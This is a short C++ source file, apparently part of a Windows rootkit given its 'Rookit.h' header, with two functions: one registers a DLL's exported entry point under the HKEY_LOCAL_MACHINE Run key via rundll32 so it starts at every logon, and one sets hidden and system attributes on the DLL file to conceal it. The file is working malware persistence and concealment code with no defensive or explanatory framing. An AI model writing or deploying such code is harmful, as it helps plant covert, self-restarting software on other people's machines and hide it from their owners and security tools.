#include"Rookit.h"


void AddDllToStartup(char* dll) {
    std::string dllPath = dll;
    std::string functionName = "StartUM";
    std::string value = "StartUM";
    std::string command = "rundll32.exe " + dllPath + "," + functionName;

    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        return;
    }
    result = RegSetValueEx(hKey, value.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(command.c_str()), command.size() + 1);
    if (result != ERROR_SUCCESS) {
        return;
    }
    RegCloseKey(hKey);
}

void HideDllFile(char* dllPath){
    SetFileAttributes(dllPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}
